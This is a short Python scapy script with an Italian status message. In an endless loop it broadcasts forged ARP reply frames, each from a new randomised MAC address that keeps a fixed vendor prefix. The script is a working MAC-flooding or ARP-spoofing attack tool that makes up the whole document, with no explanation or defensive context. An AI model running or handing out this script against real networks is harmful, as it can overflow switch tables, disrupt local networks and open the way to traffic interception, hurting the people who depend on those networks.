#!/usr/bin/env python3
from scapy.all import *

vendor = "b8:e8:56:"
destMAC = "FF:FF:FF:FF:FF:FF"

while True:
    
    randMAC = vendor + ':'.join(RandMAC().split(':')[3:])

  
    print(f"Invio con MAC: {randMAC}") 

    
    sendp(
        Ether(src=randMAC ,dst=destMAC)/
        ARP(op=2, psrc="0.0.0.0", hwdst=destMAC)/
        Padding(load="X"*18),
        verbose=0
    )
    
